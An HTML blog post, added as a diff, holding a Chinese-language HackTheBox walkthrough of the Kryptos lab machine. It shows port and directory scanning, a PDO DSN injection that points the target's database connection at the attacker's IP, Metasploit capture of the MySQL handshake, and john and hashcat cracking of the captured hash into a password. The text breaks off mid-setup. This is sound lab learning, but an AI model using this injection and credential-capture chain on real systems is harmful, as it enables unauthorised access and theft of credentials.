@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>HackTheBox-Kryptos靶机渗透笔记 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">HackTheBox-Kryptos靶机渗透笔记</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-12-12&nbsp;&nbsp;15:35:28</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/0.png" alt="0"></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>靶机信息：<a href="https://www.hackthebox.eu/home/machines/profile/183" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/183</a></p>
+<p>靶机地址：10.10.10.129</p>
+<p>攻击机地址：因为学习这个靶机花费的时间比较长，所以期间ip地址发生了几次变化，分别是：</p>
+<blockquote>
+<ul>
+<li>10.10.14.5</li>
+<li>10.10.14.6</li>
+<li>10.10.14.12</li>
+<li>10.10.14.33</li>
+</ul>
+</blockquote>
+<p>这个靶机的评级是Insane，我最后没有做完，这个靶机和它的名称Kryptos一样，需要一些crypto方面的知识。这个靶机涉及到的web方面的知识还是挺有趣的。一个是通过PDO的dsn注入来绕过登录验证；另一个是学习了sqlite3中的ATTACH DATABASE注入；最后还学习到了RC4这种流加密算法，明文加密后得到密文，再对密文进行一次加密就能重新得到明文。</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩，先上nmap扫描开放端口：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">╭─root@vultr ~ </span><br><span class="line">╰─# cat nmap.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) </span><br><span class="line">nmap -p$ports -sC -sV $1</span><br><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ ./nmap.sh 10.10.10.129</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 15:31 UTC</span><br><span class="line">Nmap scan report for 10.10.10.129</span><br><span class="line">Host is up (0.0035s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 2c:b3:7e:10:fa:91:f3:6c:4a:cc:d7:f4:88:0f:08:90 (RSA)</span><br><span class="line">|   256 0c:cd:47:2b:96:a2:50:5e:99:bf:bd:d0:de:05:5d:ed (ECDSA)</span><br><span class="line">|_  256 e6:5a:cb:c8:dc:be:06:04:cf:db:3a:96:e7:5a:d5:aa (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Cryptor Login</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds</span><br></pre></td></tr></table></figure>
+
+<p>只扫描到两个端口22和80，分别对应ssh服务和apache服务。</p>
+<h3 id="APACHE服务"><a href="#APACHE服务" class="headerlink" title="APACHE服务"></a>APACHE服务</h3><p><code>gobuster</code>扫描 <a href="http://10.10.10.129" target="_blank" rel="noopener">http://10.10.10.129</a> 目录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">╭─root@vultr ~ </span><br><span class="line">╰─# gobuster dir -u http://10.10.10.129 -w /usr/share/wordlists/directory-list-2.3-medium.txt -x txt,php,pdf,html</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.129</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php,pdf</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/12/03 12:58:33 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/dev (Status: 403)</span><br><span class="line">/logout.php (Status: 302)</span><br><span class="line">/url.php (Status: 200)</span><br><span class="line">/aes.php (Status: 200)</span><br><span class="line">/encrypt.php (Status: 302)</span><br><span class="line">/rc4.php (Status: 200)</span><br><span class="line">/decrypt.php (Status: 302)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2020/12/03 13:03:22 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>存在目录<code>/css</code>和<code>/dev</code>，前者应该是存放css文件的，访问 <a href="http://10.10.10.129/dev" target="_blank" rel="noopener">http://10.10.10.129/dev</a> 提示权限不够：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/3.png" alt="3"></p>
+<p>还有这些<code>.php</code>页面，访问<code>url.php</code>，<code>aes.php</code>和<code>rc4.php</code>都是空白页面，没有回显；访问<code>encrypt.php</code>和<code>decrypt.php</code>则会被重定向至<code>index.php</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;url.php (Status: 200)</span><br><span class="line">&#x2F;aes.php (Status: 200)</span><br><span class="line">&#x2F;encrypt.php (Status: 302)</span><br><span class="line">&#x2F;rc4.php (Status: 200)</span><br><span class="line">&#x2F;decrypt.php (Status: 302)</span><br></pre></td></tr></table></figure>
+
+<p>访问<a href="http://10.10.10.129/index.php" target="_blank" rel="noopener">http://10.10.10.129/index.php</a> ，是一个登录界面：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/1.png" alt="1"></p>
+<p>因为不知道账号和密码，所以直接先上burp fuzz，抓到的包有四个参数<code>username</code>，<code>password</code>，<code>db</code>以及<code>token</code>：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/6.png" alt="6"></p>
+<p>先对<code>username</code>和<code>password</code>进行fuzz：<br><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/4.png" alt="4"></p>
+<p>结果发现<code>token</code>是不可重用的，每次请求的token都会重新生成，目的应该是anti-CSRF：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/5.png" alt="5"></p>
+<p>右键查看源码：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/2.png" alt="2"></p>
+<p>我们知道的是，每次请求的token都是新的值，每次提交，token都会改变，但是<code>db</code>不会改变，所以尝试改变下<code>db</code>：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/8.png" alt="8"></p>
+<p>结果返回<code>PDOException code: 1044</code>，说明使用<strong>PDO</strong>作为数据库的查询接口，1044状态码则是 Access denied导致的：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/9.png" alt="9"></p>
+<h3 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h3><p>PDO全称<strong>PHP Data Objects</strong>，先看一下官方对PDO的简介：</p>
+<blockquote>
+<p><code>PHP 数据对象</code> （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。实现 PDO 接口的每个数据库驱动可以公开具体数据库的特性作为标准扩展功能。 注意利用 PDO 扩展自身并不能实现任何数据库功能；必须使用一个 <a href="https://www.php.net/manual/zh/pdo.drivers.php" target="_blank" rel="noopener">具体数据库的 PDO 驱动</a> 来访问数据库服务。</p>
+<p>PDO 提供了一个 <em>数据访问</em> 抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。 PDO <em>不</em>提供 <em>数据库</em> 抽象层；它不会重写 SQL，也不会模拟缺失的特性。如果需要的话，应该使用一个成熟的抽象层。</p>
+</blockquote>
+<p>比如下面是一个简单的PDO对象实例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$dbms = <span class="string">'mysql'</span>;</span><br><span class="line">$dbName = <span class="string">'admin'</span>;</span><br><span class="line">$user = <span class="string">'root'</span>;</span><br><span class="line">$pwd = <span class="string">'password'</span>;</span><br><span class="line">$host = <span class="string">'localhost'</span>;</span><br><span class="line"><span class="comment">// $dsn = 'mysql:host=$host;dbname=$dbName';</span></span><br><span class="line">$dsn = <span class="string">'$dbms:host=$host;dbname=$dbName'</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $pdo = <span class="keyword">new</span> PDO($dsn, $user, $pwd);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"PDO连接MySQL成功"</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage(). <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="DSN"><a href="#DSN" class="headerlink" title="DSN"></a>DSN</h4><p>PDO中有一个名为DSN的概念，DSN全称为<strong>Data Source Name（数据源名称）</strong>。DSN主要负责提供数据库连接的必要信息。PDO的DSN主要包括3部分：</p>
+<ol>
+<li>PDO驱动名称，如mysql，sqlite或是pgsql；</li>
+<li>冒号<code>:</code></li>
+<li>驱动特定的语法</li>
+</ol>
+<p>数据库服务器只在特定的端口上监听连接请求，所以每种数据库服务器有一个默认的端口号，如mysql是3306，但是数据库管理员可以对端口号进行修改，此时就可以在DSN中写明端口号。</p>
+<p>如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dsn = <span class="string">"mysql:host=localhost;port=3306;dbname=test"</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="DSN注入"><a href="#DSN注入" class="headerlink" title="DSN注入"></a>DSN注入</h4><p>接着回到靶机本身，因为<code>db</code>参数是可变的，也就是数据库名称，所以猜测PDO对象是这样进行实例化的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$dsn = <span class="string">"mysql:dbname="</span>. $POST[<span class="string">'db'</span>]. <span class="string">";host=localhost"</span>;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO($dsn, $user, $pwd);</span><br></pre></td></tr></table></figure>
+
+<p>或者更简单的，<code>host</code>参数可以省略：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$dsn = <span class="string">"mysql:dbname="</span>. $POST[<span class="string">''</span>db];</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO($dsn, $user, $pwd);</span><br></pre></td></tr></table></figure>
+
+<p>然后就是看一下返回的PDOException状态码是什么意思。google一下，从<a href="https://stackoverflow.com/questions/744656/possible-pdoexception-errors-mysql-5" target="_blank" rel="noopener">Possible PDOException Errors (MySQL 5)?</a> 了解到：</p>
+<blockquote>
+<p> Error codes starting at 1000 are <a href="https://dev.mysql.com/doc/refman/8.0/en/server-error-reference.html" target="_blank" rel="noopener">server errors</a>. These include errors like: </p>
+<ul>
+<li><p>Error: 1045 SQLSTATE: 28000 (<code>ER_ACCESS_DENIED_ERROR</code>) Message: Access denied for user ‘%s’@’%s’ (using password: %s)</p>
+</li>
+<li><p>Error: 1049 SQLSTATE: 42000 (<code>ER_BAD_DB_ERROR</code>) Message: Unknown database ‘%s’</p>
+<p>Error codes starting at 2000 are <a href="https://dev.mysql.com/doc/refman/8.0/en/client-error-reference.html" target="_blank" rel="noopener">client errors</a>. These include errors like: </p>
+</li>
+<li><p>Error: 2005 (<code>CR_UNKNOWN_HOST</code>) Message: Unknown MySQL server host ‘%s’ (%d)</p>
+</li>
+<li><p>Error: 2003 (<code>CR_CONN_HOST_ERROR</code>) Message: Can’t connect to MySQL server on ‘%s’ (%d)</p>
+</li>
+</ul>
+</blockquote>
+<p>根据MySQL官方手册查询到错误1044表示权限不正确：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error number: 1044; Symbol: ER_DBACCESS_DENIED_ERROR; SQLSTATE: 42000</span><br><span class="line">Message: Access denied for user &#39;%s&#39;@&#39;%s&#39; to database &#39;%s&#39;</span><br></pre></td></tr></table></figure>
+
+<p>错误2002表示无法和local MySQL服务器建立连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error number: 2002; Symbol: CR_CONNECTION_ERROR;</span><br><span class="line">Message: Can&#39;t connect to local MySQL server through socket &#39;%s&#39; (%d)</span><br></pre></td></tr></table></figure>
+
+<p>将<code>db</code>修改为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db=cryptor;host=10.10.14.6;port=3306</span><br></pre></td></tr></table></figure>
+
+<p>然后请求，burp抓包，为了方便起见，修改下burp的参数，这样每次抓包就不用手动修改<code>db</code>参数了：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/17.png" alt="17"></p>
+<p>在攻击机kali上监听本地端口<code>3306</code>：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/12.png" alt="12"></p>
+<p>可以看到返回的是<code>connect to [10.10.14.5] from (UNKNOWN) [10.10.10.129] 34662</code>，这说明目标服务器确实在尝试联系我们的攻击机3306端口（ps：这里ip地址改变是因为htb使用的openvpn给我重新分配了地址，后面还会发生变化，但是都是10.10.14.xx）。</p>
+<p>停止监听后，返回状态码<code>2006</code>：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/13.png" alt="13"></p>
+<p>查阅官方手册，状态码2006表示mysql 服务被关闭了，和我们的测试情况保持一致：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error number: 2006; Symbol: CR_SERVER_GONE_ERROR;</span><br><span class="line">Message: MySQL server has gone away</span><br></pre></td></tr></table></figure>
+
+<h4 id="auxiliary-server-capture-mysql"><a href="#auxiliary-server-capture-mysql" class="headerlink" title="auxiliary/server/capture/mysql"></a>auxiliary/server/capture/mysql</h4><p>在metasploit中存在一个模块<code>auxiliary/server/capture/mysql</code>，可以捕获mysql的流量信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/capture/mysql</span><br><span class="line">msf5 auxiliary(server/capture/mysql) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/capture/mysql):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                           Required  Description</span><br><span class="line">   ----        ---------------                           --------  -----------</span><br><span class="line">   CAINPWFILE                                            no        The local filename to store the hashes in Cain&amp;Abel format</span><br><span class="line">   CHALLENGE   112233445566778899AABBCCDDEEFF1122334455  yes       The 16 byte challenge</span><br><span class="line">   JOHNPWFILE                                            no        The prefix to the local filename to store the hashes in JOHN format</span><br><span class="line">   SRVHOST     0.0.0.0                                   yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT     3306                                      yes       The local port to listen on.</span><br><span class="line">   SRVVERSION  5.5.16                                    yes       The server version to report in the greeting response</span><br><span class="line">   SSL         false                                     no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                                               no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name     Description</span><br><span class="line">   ----     -----------</span><br><span class="line">   Capture</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/14.gif" alt="14"></p>
+<p><code>auxiliary/server/capture/mysql</code>模块捕获到的信息是challenge和response：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user: dbuser</span><br><span class="line">Challenge: 112233445566778899aabbccddeeff1122334455</span><br><span class="line">Response: 73def07da6fba5dcc1b19c918dbd998e0d1f3f9d</span><br><span class="line">Database: cryptor</span><br></pre></td></tr></table></figure>
+
+<p>同时返回的状态码是<code>1045</code>，原因是权限不正确。接着我们需要对其进行解密来获取mysql的登录密码，但是这个密码该怎么用呢？可以查阅hashcat中的example-hashes：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ hashcat --example-hashes | grep MySQL -A 2</span><br><span class="line">TYPE: MySQL323</span><br><span class="line">HASH: 7196759210defdc0</span><br><span class="line">PASS: hashcat</span><br><span class="line">--</span><br><span class="line">TYPE: MySQL4.1/MySQL5</span><br><span class="line">HASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130</span><br><span class="line">PASS: hashcat</span><br><span class="line">--</span><br><span class="line">TYPE: MySQL CRAM (SHA1)</span><br><span class="line">HASH: $mysqlna$2576670568531371763643101056213751754328*5e4be686a3149a12847caa9898247dcc05739601</span><br><span class="line">PASS: hashcat</span><br></pre></td></tr></table></figure>
+
+<p>按照格式拼接challenge和response后，丢到john里解密：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt mysql_hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32&#x2F;64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">krypt0n1te       (?)</span><br><span class="line">1g 0:00:00:03 DONE (2020-12-05 01:05) 0.2857g&#x2F;s 1843Kp&#x2F;s 1843Kc&#x2F;s 1843KC&#x2F;s kryptic11..krovallo</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>也可以丢到hashcat解密：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ hashcat -m 11200 mysql_hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force                                   </span><br><span class="line">......[SNIP]......[SNIP]......</span><br><span class="line">$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d:krypt0n1te</span><br><span class="line">......[SNIP]......[SNIP]......</span><br></pre></td></tr></table></figure>
+
+<p>总之，最后得到了密码：<code>krypt0n1te</code>。简单来讲，这个流程就是：当攻击者用<code>admin:admin</code>的用户密码尝试登录时，应用程序会先连接本地或是远程的mysql数据库，然后取中数据库中的信息来比对攻击者的账号密码是否正确，连接哪个数据库由dns中的信息决定。除此之外，连接mysql数据库需要对应的mysql账号密码，应用程序会用自己配置信息中的账号密码去连接。如果需要应用程序连接我们本地的数据库来绕过验证，那么就需要获取应用程序配置信息中的mysql连接配置。</p>
+<p>到这一步为止，我们就获得了应用程序相关的mysql配置信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: mysql</span><br><span class="line">database_name: cryptor</span><br><span class="line">user: dbuser</span><br><span class="line">password: krypt0n1te</span><br></pre></td></tr></table></figure>
+
+<p>拿这个密码去登录站点是不行的，毕竟这只是数据库的密码。接着，在我们本地的攻击机上搭建环境，先启动本地的mysql环境：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/15.png" alt="15"></p>
+<p>在本地建立数据库<code>cryptor</code>，并赋予用户<code>dbuser</code>相应的权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─$ sudo mysql -uroot -proot</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 38</span><br><span class="line">Server version: 10.3.22-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span 